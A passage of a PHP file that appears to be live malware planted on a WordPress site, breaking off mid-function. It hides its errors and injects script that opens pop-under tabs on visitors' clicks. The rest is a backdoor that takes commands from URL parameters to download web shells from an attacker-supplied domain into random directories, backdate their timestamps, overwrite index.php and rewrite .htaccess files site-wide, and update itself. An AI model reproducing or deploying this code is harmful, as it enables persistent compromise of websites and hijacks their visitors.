<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0){
	echo '<script>(function (parameters) {
		const targets = [
			\'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\'
		]
		// Times between clicks
		const restMinutes = 1;
		// Number of hours to allow re-click 
		const allowedHours = 2;


		const saveTargetLocationsToStorage = (targets) => {
			targets.forEach((target, index) => {
				if(!localStorage.getItem(`${target}-local-storage`)){
					localStorage.setItem(`${target}-local-storage`, 0);
				}
			});
		}
		const getRandomLocationFromStorage = (targets) => {
			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
		}
		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getMintsDiff = (startDate, endDate) => {
			const msInMints = 1000 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInMints);
		}

		const visitNewLocation = (targets, host, nowDate) => {
			saveTargetLocationsToStorage(targets);
			newLocation = getRandomLocationFromStorage(targets);
			setTimeToStorage(`${host}-mnts`, nowDate);
			setTimeToStorage(`${host}-hurs`, nowDate);
			setLocationAsVisited(newLocation);
			window.open(newLocation, "_blank");
		}

		// const randomLocation = getRandomLocationFromStorage(targets);
		saveTargetLocationsToStorage(targets);

		function globalClick(event) {
			event.stopPropagation();
			const host = location.host;
			let newLocation = getRandomLocationFromStorage(targets);
			const nowDate = Date.parse(new Date());
			const savedDateForMints = getTimeStorage(`${host}-mnts`);
			const savedDateForHours = getTimeStorage(`${host}-hurs`);

			if (savedDateForMints && savedDateForHours) {
				try {
					const storageDateForMints = parseInt(savedDateForMints);
					const storageDateForHours = parseInt(savedDateForHours);
					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

					if (hoursDiff >= allowedHours) {
						saveTargetLocationsToStorage(targets);
						setTimeToStorage(`${host}-hurs`, nowDate);
					}
					if (mintsDiff >= restMinutes) {
						if (newLocation) {
							setTimeToStorage(`${host}-mnts`, nowDate);
							window.open(newLocation, "_blank");
							setLocationAsVisited(newLocation);
						}
					}
				} catch (error) { visitNewLocation(targets, host, nowDate); }
			} else { visitNewLocation(targets, host, nowDate); }
		}
		document.addEventListener("click", globalClick)
	})()</script>';
}

?>
<?php 
    error_reporting(0);
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function curl_get_contents($url){
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
    function check_remote_file_exists($url) {
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_NOBODY, true);
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	    $result = curl_exec($curl);
	    $found = false;
	    if ($result !== false) {
	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	        if ($statusCode == 200) {
	            $found = true;
	        }
	    }
	    curl_close($curl);
	    return $found;
	}
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = @fopen($file2, "w");
	  	@fwrite($openedfile, $contentx);
	  	@fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function read_dir_queue1($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>$level){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function rpath_arry($dir){
		$files=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					//if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function getInd_Content($base_path1){
 		$file_path = $base_path1.'/index.php';
 		$file_path1 = $base_path1.'/index.html';
 		$file_path2 = $base_path1.'/index.htm';
 		$file_path3 = $base_path1.'/default.html';
 	
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			$shell_content1=  $str;
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
            echo $shell_content3;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
	}
	function dir_size1($dir3,$url){
	      $dh = @opendir($dir3);
	      $return = array();
		  while($file = @readdir($dh)){
		     if($file!='.' and $file!='..'){
		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
	         }
	      }  
          @closedir($dh);             
          @array_multisort($filetime);
          return $filetime;
	}
 	$sig=@$_GET['sig'];
 	@$domain_2020='http://'.$_GET['domain'];
 	if($sig=='beima'){
 		$level = $_GET['level'];
 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $_GET['file_name']!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5))
		    {
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='jc_other'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5))
		    {
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='lock_index'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath){
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5)){
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='wp_add_back'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath){
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5)){
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='plan_task'){
		$shell_source5 = $domain_2020."/plan_task.html";
		if(check_remote_file_exists($shell_source5)){
			$shell_end5 = BASE_PATH.'/wp-activate.php';
	 		if(copyfiles($shell_source5,$shell_end5)){
		    	if($_SERVER["HTTPS"] == "on"){
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5)){
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on"){
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5)){
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
		 		$time4=strtotime('2020-03-09 12:03:05');
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='jc_index'){
 		$domain_name1 = trim(str_replace("www.","",$_SERVER['SERVER_NAME']));
 		$shell_file = $_GET['shell_file'];
		$file_path= BASE_PATH.'/index.php';
 		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
 	    //if(!check_remote_file_exists($file_path1)){
			$ser_url1= $domain_2020."/cpa_ind5.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."&shell_file=".$shell_file."";
			$file_contents_2=curl_get_contents($ser_url1);
		//}
		if(@$_SERVER["HTTPS"]=="on")
		{
		    $http1="https://";
		}else{
		    $http1="http://";
		}
		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	    $str1=@curl_get_contents($file_path1);
		$str=@file_get_contents($file_path);
	 	if(file_exists($file_path)){
		    if(check_remote_file_exists($file_path1)){
		    	$str1=@curl_get_contents($file_path1);
				$str=@file_get_contents($file_path);
				if($str==$str1){
					 echo $tishi.'|index.php write success!';
				}else{
				     //echo 'fail';
			         @chmod($file_path,0644);
			         $result_unlink=unlink($file_path);
			         if($result_unlink){
				         if(copyfiles($file_path1,$file_path))
				         {
					 		 $time3=dir_size1(dirname(__FILE__),'');
					 		 $time4=strtotime($time3[0]);
					 		 touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 touch($file_path,$time4);
					 		 echo $tishi.'|index.php write success!';
				         }
				         else
				         {
				         	file_put_contents($file_path,$str1);
				         	$str1=@curl_get_contents($file_path1);
							$str=@file_get_contents($file_path);
				         	if($str==$str1){
						 		$time3=dir_size1(dirname(__FILE__),'');
						 		$time4=strtotime($time3[0]);
					 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 	touch($file_path,$time4);
					 		 	echo $tishi.'|index.php write success!';
				         	}else{
				         		echo $tishi.'|index.php write fail!';
				         	}
				         }
			         }  
				}
			}
	    }else{
	    	if(check_remote_file_exists($file_path1)){
			    @chmod($file_path,0644);
			    if(copyfiles($file_path1,$file_path))
			    {
			        $time3=dir_size1(dirname(__FILE__),'');
			 		$time4=strtotime($time3[0]);
		 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
		 		 	touch($file_path,$time4);
		 		 	echo $tishi.'|index.php write success!';
			    }
			    else
			    {
		    		file_put_contents($file_path,$str1);
		    		$str1=@curl_get_contents($file_path1);
					$str=@file_get_contents($file_path);
		    		if($str==$str1){
				 		$time3=dir_size1(dirname(__FILE__),'');
				 		$time4=strtotime($time3[0]);
			 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
			 		 	touch($file_path,$time4);
			 		 	echo $tishi.'|index.php write success!';
		         	}else{
		         		echo $tishi.'|index.php write fail!';
		         	}
			    }
	    	}else{
	    		$shell_cont1 = getInd_Content(BASE_PATH);
			    $shell_file = $_GET['shell_file'];
			    $file_path1 = $domain_2020."/".$shell_file.".html";
			    $shell_content = @curl_get_contents($file_path1);
			    $shell_cont2 = substr_replace($shell_cont1,$shell_content,0,0);
	    		@file_put_contents($file_path,$shell_cont2);
	    	}
		}
		exit;
 	}else if($sig=='change_hta'){
 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@curl_get_contents($shell_source5);
	 	if(strpos($str7,'<FilesMatch') !== false){	
		 	$file_htaccess = BASE_PATH.'/.htaccess';
	 		if($_SERVER["HTTPS"] == "on") 
			{
			    $http1="https://";
			}else{
			    $http1="http://";
			}
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}
		}else{
		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
	    exit;
 	}else if($sig=='change_hta_all'){
 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@curl_get_contents($shell_source5);
	 	if(strpos($str7,'<FilesMatch') !== false){
 			$file_htaccess = BASE_PATH.'/.htaccess';
	 		if($_SERVER["HTTPS"] == "on")
			{
			    $http1="https://";
			}else{
			    $http1="http://";
			}
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}
	 		
	 		$files1 = @rpath_arry($_SERVER['DOCUMENT_ROOT']);
	 		$files2 =array();
	 		for($k=0;$k<count($files1);$k++){
	 			$files2[]=dirname($files1[$k]);
	 		}
	 		$files3=array();
	 		$files3 =array_filter(array_unique($files2));
	 		foreach ($files3 as $key=>$value){
		 		if( $files3[$key]!= BASE_PATH){
		 			$file_htaccess1 = $files3[$key].'/.htaccess';
		 			//file_put_contents($file_htaccess1,$str7);
		 			copyfiles($shell_source5,$file_htaccess1);
		 		    //echo $file_htaccess1.'--11<br />';
		 		}
	 		}
		}else{
		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
	    exit;
 	}else if($sig=='rename'){
 		$rename = $_GET['rename'];
 		$source_name = $_GET['source_name'];
 		if($_GET['tag']!=''){
 			$tag='#'.$_GET['tag'];
 		}else{
 			$tag='';
 		}
 		if($rename!="" && $source_name!=""){
	 		$rename_file = dirname(__FILE__).'/'.$rename;
		 	$source_file = dirname(__FILE__).'/'.$source_name;
	 		if($_SERVER["HTTPS"] == "on") 
			{
			   $http1="https://";
			}else{
			   $http1="http://";
			}
			$rename_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($rename_file));
			$source_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($source_file));
			$rename_file1 = str_replace('\\','/',$rename_file1);
			$source_file1 = str_replace('\\','/',$source_file1);
		    if(file_exists($source_file)){
		        if(rename($source_file,$rename_file)){
		            echo $rename_file1.$tag;
		        }else{
		            echo $source_file1.$tag.'| rename fail!';
		        }
		    }else{
		        echo $source_file1.$tag.'| no exists!';
		    }
 		}else{
 			echo $source_file1.$tag.'| rename fail!';
 		}
 		exit;
 	}else if($sig=='update'){
 		$style_2020=$domain_2020.'/style_2020.html';
 		$file_style=__FILE__;
 		if(check_remote_file_exists($style_2020)){
 			$str7=@curl_get_contents($style_2020);
	 		if(strpos($str7,'domain_2020') !== false){	
		 		if($_SERVER["HTTPS"] == "on") 
				{
				    $http1="https://";
				}else{
				    $http1="http://";
				}
				$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	 			if(copyfiles($style_2020,$file_style))
			    {
			    	$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($file_style,$time4);
			    	echo $tishi.'--update success!';
			    }else{
			    	$shell_cont5=@curl_get_contents($style_2020);
			    	$shell51=@file_put_contents($file_style,$shell_cont5);
			    	if($shell51>0){
			    		$time3=@dir_size1(dirname(__FILE__),'');
						$time4=strtotime($time3[0]);
						touch($file_style,$time4);
						echo $tishi.'--update success!';
			    	}else{
			    		echo $tishi.'--update fail!';
			    	}
			    }
	 		}	
 		}
		exit;	
 	}else if($sig=='shell519'){
		$rename = $_GET['file_name'];
		$shell_file = $_GET['shell_file'];
		if($rename!="" && $shell_file!=""){
	 		$shell_source5= $domain_2020."/".$shell_file.".html";
	 		if(check_remote_file_exists($shell_source5)){
 				$level = $_GET['level'];
		 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
				function getDepth($sPath) {
				    return substr_count($sPath, '/');
				}
				$aPathDepths = array_map('getDepth', $aPathes);
				arsort($aPathDepths);
				$arry1=array();
				foreach ($aPathDepths as $iKey => $iDepth) {
					$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
					$arry11 = dirname($arry11);
					$arry22 = explode("/",$arry11);
					if(count($arry22)==$level){
						$arry1[] = dirname($aPathes[$iKey]);
					}else{
						$arry1[] = dirname($aPathes[$iKey]);
					}
				}
				$arry2= array_filter(array_unique($arry1));
				shuffle($arry2);
				$rndKey = array_rand($arry2);
				$create_path1 = $arry2[$rndKey];
	 			$shell5=$create_path1.'/'.$rename;
		 		if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		 		if(copyfiles($shell_source5,$shell5))
			    {
